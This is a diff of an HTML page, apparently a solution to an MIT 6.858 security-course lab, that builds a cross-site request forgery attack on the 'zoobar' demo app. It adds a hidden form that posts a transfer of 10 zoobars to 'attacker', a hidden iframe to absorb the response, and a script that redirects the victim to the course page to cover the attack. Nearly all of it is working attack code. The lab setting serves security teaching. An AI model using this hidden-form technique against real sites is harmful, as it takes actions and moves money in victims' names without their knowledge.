@@ -3,17 +3,27 @@
 <head>
 </head>
 <body>
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"
+style="display:none; visibility:hidden;"
+target="hi">
+<input name="zoobars" type="text" value="10">
+<input name="recipient" type="text" value="attacker">
+<input type="submit" name="submission" value="Send" id="asdf">
+</form>
+
 <script>
-var req = new XMLHttpRequest();
-var data = new FormData();
-data.append("recipient", "attacker");
-data.append("zoobars", "1");
-req.onreadystatechange = function(){
-    if(readyState === 4){
-         window.location.href="http://css.csail.mit.edu/6.858/2014/"
-    }
+var c = 0
+a = document.getElementById("asdf");
+b = function(){
+c += 1;
+console.log(c);
+if(c === 2){
+    window.location.href="http://css.csail.mit.edu/6.858/2014/";
+}
 }
 </script>
+
+<iframe name="hi" onload = "b()" style="visibility:hidden; display:none;">
 
 </body>
 </html>
